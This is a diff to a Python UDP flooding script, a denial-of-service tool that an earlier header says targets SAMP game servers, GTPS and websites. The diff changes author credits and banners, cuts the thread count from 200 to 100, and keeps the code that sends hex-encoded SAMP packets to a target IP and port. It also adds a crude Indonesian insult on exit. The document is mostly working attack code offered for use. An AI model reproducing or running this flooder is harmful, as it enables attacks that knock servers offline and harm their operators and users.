@@ -1,6 +1,6 @@
-##Remake By Jeje
+##Remake By han
 
-##UDP FLOODING FOD SAMP | GTPS | WEBSITE
+##UDP FLOODING
 
 import socket
 
@@ -44,23 +44,27 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
 
 os.system("clear")
 
-print("\033[31mAttack To IP %s|%s"%(orgip,port))
+print("Coded By Aryaa")
 
- print('''
+print("""
 
-    /\_____/\    My Team for support : https://discord.gg/YqkZTAqNJY
+██████╗░██╗░░░██╗░░░░░░██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗
 
-   /  o   o  \    Support My Partner : Jeje & JetX & Xhan
+██╔══██╗╚██╗░██╔╝░░░░░░██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝
 
-  ( ==  ^  == )   My Discord : pip.#3631
+██████╔╝░╚████╔╝░█████╗██████╦╝██║░░██║░░░██║░░░██╔██╗██║█████╗░░░░░██║░░░
 
-   )         (    YouTube : pipsamp
+██╔═══╝░░░╚██╔╝░░╚════╝██╔══██╗██║░░██║░░░██║░░░██║╚████║██╔══╝░░░░░██║░░░
 
-  (           )   ========================================================
+██║░░░░░░░░██║░░░░░░░░░██████╦╝╚█████╔╝░░░██║░░░██║░╚███║███████╗░░░██║░░░
 
- ( (  )   (  ) )     DDOS FOR SAMP, ULTRA - HOST, 20GTPS
+╚═╝░░░░░░░░╚═╝░░░░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░""")
 
-(__(__)___(__)__) ===== Version: 1.0.0''')
+print("Credit : Arya")
+
+print("Attack By Aryaa To IP %s|%s"%(orgip,port))
+
+            
 
 class MyThread(threading.Thread):
 
@@ -70,11 +74,11 @@ class MyThread(threading.Thread):
 
                 sock = socket.socket(
 
-                    socket.AF_INET, socket.SOCK_DGRAM)
+                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
 
                 
 
-                msg = Pacotes[random.randrange(0,5)]
+                msg = Pacotes[random.randrange(0,3)]
 
                      
 
@@ -108,7 +112,7 @@ if __name__ == '__main__':
 
     try:
 
-     for x in range(200):                                    
+     for x in range(100):                                    
 
             mythread = MyThread()  
 
@@ -119,3 +123,17 @@ if __name__ == '__main__':
     except(KeyboardInterrupt):
 
          os.system('cls' if os.name == 'nt' else 'clear')
+
+         
+
+         print('#########################################################################')
+
+         print('NGAPAIN CLOSE ANJING')
+
+         print('#########################################################################')
+
+         print('\n\n')
+
+         print('Ataque para ip {} foi parado'.format(orgip))
+
+         pass
